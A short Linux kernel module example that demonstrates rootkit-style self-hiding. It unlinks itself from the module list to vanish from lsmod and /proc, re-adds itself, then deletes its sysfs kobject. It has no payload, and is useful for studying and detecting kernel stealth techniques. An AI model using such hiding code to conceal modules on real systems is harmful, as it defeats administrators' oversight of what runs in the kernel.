#include <linux/module.h>
#include <linux/init.h>

/*
 Will store the head for the list where THIS_MODULE is 
*/
struct list_head  * module;

static int __init lkm_init(void)
{
        module = THIS_MODULE->list.prev;                //<- Save list head for this module
        
        pr_info("\nHiding Module\n");

        pr_info("  -- Hiding from lsmod\n");
        
        list_del_init(&__this_module.list);

        pr_info("  -- Showing for lsmod and /proc\n");

        list_add(&__this_module.list, module );
        
        pr_info("  -- Hiding for sysfs\n");

        kobject_del(&(&__this_module)->mkobj.kobj);

        pr_info("Done!\n");

        return 0;
}


static void __exit lkm_exit(void)
{
        pr_info("Exiting... Bye World\n");
}

module_init(lkm_init);                                                                 
module_exit(lkm_exit);                                                                               

MODULE_AUTHOR("Guillem Alminyana");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("LKM Hide/Show Module Example");
~                                                                                                                    
~                       
